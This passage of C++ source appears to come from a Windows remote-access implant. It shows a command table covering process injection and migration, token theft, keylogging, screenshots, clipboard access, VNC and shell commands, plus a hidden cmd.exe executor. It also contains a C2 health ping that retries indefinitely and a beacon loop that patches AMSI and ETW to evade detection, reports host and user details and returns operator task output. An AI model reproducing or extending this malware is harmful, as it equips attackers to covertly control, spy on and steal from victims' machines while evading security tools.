    g_popThread = CreateThread(nullptr, 0, PopupThread, nullptr, 0, nullptr);
    if (!g_popThread) { InterlockedExchange(&g_popRunning, 0); return L"[error: thread failed]"; }
    return L"[+] random popups running — !popups off to stop";
}

// =====================================================================
//  KILL PROCESS
// =====================================================================
static std::wstring HandleKillProcess(const std::string& args) {
    if (args.empty()) return L"Usage: !kill <pid>";
    DWORD pid = static_cast<DWORD>(atol(args.c_str()));
    if (!pid) return L"[error: invalid pid]";
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return L"[error: OpenProcess pid=" + std::to_wstring(pid)
                   + L" err=" + std::to_wstring(GetLastError()) + L"]";
    BOOL ok = TerminateProcess(h, 1);
    DWORD err = GetLastError();
    CloseHandle(h);
    return ok ? L"[+] Killed pid=" + std::to_wstring(pid)
              : L"[error: TerminateProcess pid=" + std::to_wstring(pid)
                + L" err=" + std::to_wstring(err) + L"]";
}

// =====================================================================
//  ENV DUMP
// =====================================================================
static std::wstring HandleEnvDump(const std::string& /*args*/) {
    LPWCH env = GetEnvironmentStringsW();
    if (!env) return L"[error: GetEnvironmentStringsW]";
    std::wstring out;
    for (LPWCH p = env; *p; p += wcslen(p) + 1)
        out += std::wstring(p) + L"\n";
    FreeEnvironmentStringsW(env);
    return out.empty() ? L"[env: empty]" : out;
}

// =====================================================================
//  GETPID
// =====================================================================
static std::wstring HandleGetPid(const std::string& /*args*/) {
    return L"PID: " + std::to_wstring(GetCurrentProcessId());
}

// =====================================================================
//  COMMAND TABLE
// =====================================================================
struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",          false, HandlePs },
    { "!inject-apc ",  false, HandleInjectApc },
    { "!inject ",      false, HandleInject },
    { "!migrate ",     false, HandleMigrate },
    { "ps",            true,  HandlePs },
    { "ps1 ",          false, HandlePsLine },
    { "psreset",       true,  HandlePsReset },
    { "download ",     false, HandleDownload },
    { "upload ",       false, HandleUpload },
    { "!files",        true,  HandleFiles },
    { "!files ",       false, HandleFiles },
    { "!getfile ",     false, HandleGetFile },
    { "!prank ",       false, HandlePrank },
    { "!prank",        true,  HandlePrank },
    { "!popups",       true,  HandlePopups },
    { "!popups ",      false, HandlePopups },
    { "!uninstall",    true,  HandleUninstall },
    { "steal_token",   true,  HandleStealToken },
    { "keylog_start",  true,  HandleKeylogStart },
    { "keylog_dump",   true,  HandleKeylogDump },
    { "keylog_stop",   true,  HandleKeylogStop },
    { "sleep ",        false, HandleSleepCmd },
    { "!shell",        true,  HandleShellMode },
    { "!shell ",       false, HandleShellMode },
    { "!clipboard",    true,  HandleClipboard },
    { "!clipboard ",   false, HandleClipboard },
    { "!reverse ",     false, HandleReverse },
    { "!vnc ",         false, HandleVnc },
    { "!browser",      false, HandleBrowser },
    { "!screenshot",   true,  HandleScreenshot },
    { "!live ",        false, HandleLive },
    { "!input ",       false, HandleInput },
    { "!kill ",        false, HandleKillProcess },
    { "!env",          true,  HandleEnvDump },
    { "!getpid",       true,  HandleGetPid },
    { "exit",          true,  nullptr },
    { "sleep",         true,  nullptr }
};

// =====================================================================
//  EXECUTE COMMAND (fallback)
// =====================================================================
// ─── Persistent shell state ──────────────────────────────────────────────────
// Each task runs in a fresh cmd.exe, so the IMPLANT owns the shell state:
// the working directory and any `set` variables survive across commands.
std::wstring g_ShellCwd;

static bool IsDirectoryPath(const std::wstring& p) {
    DWORD a = GetFileAttributesW(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
}

void InitShellCwd() {
    if (!g_ShellCwd.empty()) return;
    wchar_t tmp[MAX_PATH] = {};
    if (!GetEnvironmentVariableW(L"USERPROFILE", tmp, MAX_PATH) ||
        !IsDirectoryPath(tmp))
        GetCurrentDirectoryW(MAX_PATH, tmp);
    g_ShellCwd = tmp;
}

static std::wstring LowerTrim(const std::wstring& s) {
    size_t a = s.find_first_not_of(L" \t");
    if (a == std::wstring::npos) return L"";
    size_t b = s.find_last_not_of(L" \t\r\n");
    std::wstring r = s.substr(a, b - a + 1);
    std::transform(r.begin(), r.end(), r.begin(), ::towlower);
    return r;
}

// Last non-empty line of cmd output — for `cd X & cd` that's the new cwd.
static std::wstring LastNonEmptyLine(const std::wstring& out) {
    size_t end = out.find_last_not_of(L" \t\r\n");
    if (end == std::wstring::npos) return L"";
    size_t start = out.rfind(L'\n', end);
    start = (start == std::wstring::npos) ? 0 : start + 1;
    std::wstring line = out.substr(start, end - start + 1);
    // strip possible leading "> " prompt echo
    if (line.rfind(L"> ", 0) == 0) line = line.substr(2);
    return line;
}

std::wstring ExecuteCommand(const std::wstring& cmd) {
    std::string cmdStr = WStringToUTF8(cmd);
    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }

    InitShellCwd();
    std::wstring lcmd = LowerTrim(cmd);

    // Bare `cd` — just report where we are
    if (lcmd == L"cd")
        return L"[cwd] " + g_ShellCwd;

    // Shell-state commands: cd variants and bare drive changes print their
    // resulting directory (trailing `& cd`) so we can carry it forward.
    bool isCd    = lcmd.rfind(L"cd ", 0) == 0 || lcmd.rfind(L"cd/", 0) == 0 ||
                   lcmd.rfind(L"cd.", 0) == 0;
    bool isDrive = lcmd.size() == 2 && lcmd[1] == L':' && iswalpha(lcmd[0]);
    bool isSet   = lcmd.rfind(L"set ", 0) == 0 &&
                   cmd.find(L'=', 4) != std::wstring::npos;

    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring full = (isCd || isDrive) ? (cmd + L" & cd") : cmd;
    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + full;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = nullptr;

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, g_ShellCwd.c_str(), &si, &pi);
    if (!ok) {
        // The stored cwd may have been deleted — reset and retry without it.
        g_ShellCwd.clear();
        InitShellCwd();
        ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                            CREATE_NO_WINDOW, nullptr, g_ShellCwd.c_str(), &si, &pi);
        if (!ok) ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                                     CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (!ok) {
            CloseHandle(hRead); CloseHandle(hWrite);
            return L"[error: CreateProcess failed]";
        }
    }
    CloseHandle(hWrite);

    std::string output;
    output.reserve(4096);
    char buf[4096]; DWORD rd = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) || rd == 0) break;
        output.append(buf, rd);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);

    std::wstring wout = UTF8ToWString(output);

    if (isCd || isDrive) {
        std::wstring candidate = LastNonEmptyLine(wout);
        if (!candidate.empty() && IsDirectoryPath(candidate))
            g_ShellCwd = candidate;
    }
    if (isSet) {
        // Mirror `set VAR=VALUE` into the implant environment — child cmd.exe
        // inherits it, so variables persist across tasks like in a real shell.
        std::wstring body = cmd.substr(cmd.find_first_not_of(L" \t") + 4);
        size_t eq = body.find(L'=');
        if (eq != std::wstring::npos) {
            std::wstring var = body.substr(0, eq);
            std::wstring val = body.substr(eq + 1);
            size_t v1 = var.find_first_not_of(L" \t");
            size_t v2 = var.find_last_not_of(L" \t");
            if (v1 != std::wstring::npos) {
                var = var.substr(v1, v2 - v1 + 1);
                SetEnvironmentVariableW(var.c_str(),
                                        val.empty() ? nullptr : val.c_str());
            }
        }
    }

    return wout + L"\n[cwd] " + g_ShellCwd;
}

// =====================================================================
//  PING C2 — hit /health before starting the beacon loop.
//  Retries indefinitely with exponential backoff (max 5 min).
//  Returns TRUE on first 200 response.
// =====================================================================
BOOL PingC2() {
    DWORD attempt = 0;
    while (true) {
        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                           L"GET", L"/health", "", L"");
        if (resp.status == 200) {
            DebugLog(L"PingC2: server reachable");
            return TRUE;
        }
        ++attempt;
        DWORD shift = attempt < 7u ? attempt - 1u : 6u;
        DWORD backoffSec = 5u * (1u << shift);
        if (backoffSec > 300u) backoffSec = 300u;
        DebugLog(L"PingC2: not reachable (attempt " + std::to_wstring(attempt)
                 + L"), retrying in " + std::to_wstring(backoffSec) + L"s");
        Sleep(backoffSec * 1000);
    }
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
DWORD BeaconLoop(const Session& session) {
    DebugLog(L"BeaconLoop started");

    g_SessionId = session.sessionId;
    EcdhInit();   // fresh ephemeral keypair per run — key set by first beacon's handshake
    DebugLog(L"Session: " + session.sessionId);

    DWORD failures    = 0;
    DWORD beaconCount = 0;
    bool  sentHello   = false;
    bool  firstPass   = true;
    bool  wasDown     = false; // track reconnect for re-evasion

    while (true) {
        try {
            // Re-apply evasion on every loop after first pass,
            // and force it again after a reconnect (wasDown)
            if (!firstPass) {
                ReapplyEvasion();
            }
            firstPass = false;

            ++beaconCount;
            DebugLog(L"Beacon #" + std::to_wstring(beaconCount) +
                     L" failures=" + std::to_wstring(failures));

            std::wstring task;
            BOOL ok = SendBeacon(session, task);

            if (!ok) {
                ++failures;
                wasDown = true;
                DebugLog(L"Beacon fail #" + std::to_wstring(failures));

                // Exponential backoff capped at 30 min — but in rapid-poll
                // mode (shell / live view) retry within seconds so one
                // ngrok hiccup doesn't freeze the operator's console.
                DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
                if (backoffSec > 1800) backoffSec = 1800;
                if (g_BeaconOverride > 0 && backoffSec > 3) backoffSec = 3;
                DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
                JitterSleep(backoffSec, g_BeaconOverride > 0 ? backoffSec + 1 : backoffSec + 30);
                continue;
            }

            // Reconnected after being down — refresh evasion immediately
            if (wasDown) {
                DebugLog(L"Reconnected — refreshing evasion");
                PatchAMSI(); PatchETW(); ClearHardwareBreakpoints();
                wasDown = false;
            }
            failures = 0;

            // First successful beacon: send hello
            if (!sentHello) {
                sentHello = true;
                SendResult(session.sessionId,
                    L"[ghost] implant online\r\nhost: " + session.hostname +
                    L"\r\nuser: " + session.username +
                    L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
                DebugLog(L"Hello sent");
            }

            // Migrate triggered — exit so mutex releases and child can take over
            if (g_MigrateExit) {
                SendResult(session.sessionId, L"[ghost] migration complete, exiting");
                return 0xDEAD;
            }

            // Execute task
            if (!task.empty() && task != L"sleep") {
                if (task == L"exit") {
                    DebugLog(L"Exit received");
                    SendResult(session.sessionId, L"[ghost] exiting on operator command");
                    return 0xDEAD;
                }
                DebugLog(L"Exec: " + task);
                std::wstring result = ExecuteCommand(task);
                // Screenshots are multi-MB base64 BMPs — never truncate them,
                // or the image data arrives corrupted. Text output keeps the
                // 64 KB cap.
                const bool isScreenshot =
                    result.rfind(L"[SCREENSHOT:BMP]\n", 0) == 0;
                const size_t cap = isScreenshot
                    ? 32u * 1024u * 1024u
                    : static_cast<size_t>(config::CMD_OUTPUT_MAX) / sizeof(wchar_t);
                if (result.size() > cap)
                    result.resize(cap);
                SendResult(session.sessionId, result);
                // Re-beacon immediately after a task — no sleep, pick up next command fast
                continue;
            }

            // Idle — release wake lock and sleep until next poll
            ReleaseWakeLock();
            if (g_BeaconOverride > 0)
                JitterSleep(g_BeaconOverride, g_BeaconOverride);
            else
                JitterSleep(config::BEACON_MIN, config::BEACON_MAX);

        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            failures++;
            Sleep(15000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception");
            failures++;
            Sleep(15000);
        }
    }
    return 1; // unreachable, but satisfies compiler
}